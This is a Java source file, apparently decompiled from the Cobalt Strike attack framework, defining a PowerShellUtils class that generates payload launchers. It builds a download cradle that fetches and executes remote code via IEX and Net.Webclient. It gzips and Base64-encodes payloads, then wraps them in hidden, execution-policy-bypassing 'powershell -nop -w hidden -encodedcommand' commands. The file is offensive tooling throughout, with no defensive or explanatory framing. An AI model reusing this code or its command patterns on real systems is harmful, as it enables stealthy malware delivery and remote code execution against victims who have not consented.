package common;

import aggressor.AggressorClient;
import encoders.Base64;
import java.util.Stack;
import sleep.runtime.SleepUtils;

public class PowerShellUtils {
   protected AggressorClient client;

   public PowerShellUtils(AggressorClient var1) {
      this.client = var1;
   }

   public String PowerShellDownloadCradle(String var1) {
      Stack var2 = new Stack();
      var2.push(SleepUtils.getScalar(var1));
      String var3 = this.client.getScriptEngine().format("POWERSHELL_DOWNLOAD_CRADLE", var2);
      return var3 == null ? "IEX (New-Object Net.Webclient).DownloadString('" + var1 + "')" : var3;
   }

   public String PowerShellCompress(byte[] var1) {
      Stack var2 = new Stack();
      var2.push(SleepUtils.getScalar(var1));
      String var3 = this.client.getScriptEngine().format("POWERSHELL_COMPRESS", var2);
      if (var3 == null) {
         String var4 = Base64.encode(CommonUtils.gzip(var1));
         String var5 = CommonUtils.bString(CommonUtils.readResource("resources/compress.ps1")).trim();
         var5 = CommonUtils.strrep(var5, "%%DATA%%", var4);
         CommonUtils.print_stat("PowerShell Compress (built-in). Original Size: " + var1.length + ", New Size: " + var5.length());
         return var5;
      } else {
         CommonUtils.print_stat("PowerShell Compress (scripted). Original Size: " + var1.length + ", New Size: " + var3.length());
         return var3;
      }
   }

   public String encodePowerShellCommand(byte[] var1) {
      return this.encodePowerShellCommand(var1, false);
   }

   public String encodePowerShellCommand(byte[] var1, boolean var2) {
      try {
         byte[] var3 = (new ResourceUtils(this.client)).buildPowerShell(var1, var2);
         return CommonUtils.Base64PowerShell(this.PowerShellCompress(var3));
      } catch (Exception var4) {
         MudgeSanity.logException("encodePowerShellCommand", var4, false);
         return "";
      }
   }

   public byte[] buildPowerShellCommand(byte[] var1, boolean var2) {
      byte[] var3 = (new ResourceUtils(this.client)).buildPowerShell(var1, var2);
      return CommonUtils.toBytes(this.format(this.PowerShellCompress(var3), true));
   }

   public byte[] buildPowerShellCommand(byte[] var1) {
      return this.buildPowerShellCommand(var1, false);
   }

   public String format(String var1, boolean var2) {
      Stack var3 = new Stack();
      var3.push(SleepUtils.getScalar(var2));
      var3.push(SleepUtils.getScalar(var1));
      String var4 = this.client.getScriptEngine().format("POWERSHELL_COMMAND", var3);
      return var4 == null ? this._format(var1, var2) : var4;
   }

   public String _format(String var1, boolean var2) {
      var1 = CommonUtils.Base64PowerShell(var1);
      return var2 ? "powershell -nop -w hidden -encodedcommand " + var1 : "powershell -nop -exec bypass -EncodedCommand " + var1;
   }
}
